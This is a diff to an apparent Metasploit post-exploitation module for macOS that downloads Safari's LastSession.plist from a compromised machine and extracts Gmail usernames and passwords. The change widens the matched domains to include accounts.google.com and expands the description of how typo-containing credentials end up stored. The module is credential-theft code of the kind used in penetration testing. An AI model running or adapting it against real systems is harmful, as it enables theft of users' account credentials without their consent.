@@ -14,11 +14,15 @@ class Metasploit3 < Msf::Post
     super( update_info( info,
       'Name'          => 'OSX Gather Safari LastSession.plist',
       'Description'   => %q{
-        This module downloads the LastSession.plist file from the target machine.
-        LastSession.plist is used by Safari to track active websites in the current
-        session, and sometimes contains sensitive information such as usernames and
-        passwords. This module will first download the original LastSession.plist,
-        and then attempt to find the credential for Gmail.
+        This module downloads the LastSession.plist file from the target machine. 
+        LastSession.plist is used by Safari to track active websites in the current session,
+        and sometimes contains sensitive information such as usernames and passwords.
+
+        This module will first download the original LastSession.plist, and then attempt
+        to find the credential for Gmail. The Gmail's last session state may contain the
+        user's credential if his/her first login attempt failed (likely due to a typo),
+        and then the page got refreshed or another login attempt was made. This also means
+        the stolen credential might contains typos.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'sinn3r'],
@@ -111,16 +115,16 @@ class Metasploit3 < Msf::Post
   #
   # Returns the <dict> session element
   # @param xml [REXML::Element] The array element for the session data
-  # @param domain [String] The domain to search for
+  # @param domain [Regexp] The domain to search for
   # @return [REXML::Element] The <dict> element for the session data
   #
-  def get_session_element(xml, domain)
+  def get_session_element(xml, domain_regx)
     dict = nil
 
     found = false
     xml.each_element do |e|
       e.elements['array/dict'].each_element do |e2|
-        if e2.text =~ /#{domain}/
+        if e2.text =~ domain_regx
           dict = e
           found = true
           break
@@ -141,7 +145,7 @@ class Metasploit3 < Msf::Post
   #
   def find_gmail_cred(xml)
     vprint_status("#{peer} - Looking for username/password for Gmail.")
-    gmail_dict = get_session_element(xml, 'mail.google.com')
+    gmail_dict = get_session_element(xml, /(mail|accounts)\.google\.com/)
     return '' if gmail_dict.nil?
 
     raw_data = gmail_dict.elements['array/dict/data'].text
